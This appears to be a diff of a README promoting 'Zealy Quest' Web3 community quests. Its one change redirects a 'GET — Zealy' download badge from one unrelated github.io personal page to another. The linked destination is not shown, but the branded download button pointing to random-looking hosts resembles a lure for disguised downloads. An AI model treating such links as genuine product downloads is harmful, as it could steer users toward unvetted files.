@@ -1,6 +1,6 @@
  Zealy Quest - Community Quests, Rewards, and Web3 Growth
 
-[![GET â Zealy](https://img.shields.io/badge/GET%20%E2%80%94%20Zealy-5865F2?style=for-the-badge&logoColor=white)](https://imranesparzazqvc.github.io/.github/zealy-quest)
+[![GET â Zealy](https://img.shields.io/badge/GET%20%E2%80%94%20Zealy-5865F2?style=for-the-badge&logoColor=white)](https://maximusbentonoxyb.github.io/.github/zealy-quest)
 
 ## Collective Growth With Zealy at the Center
 
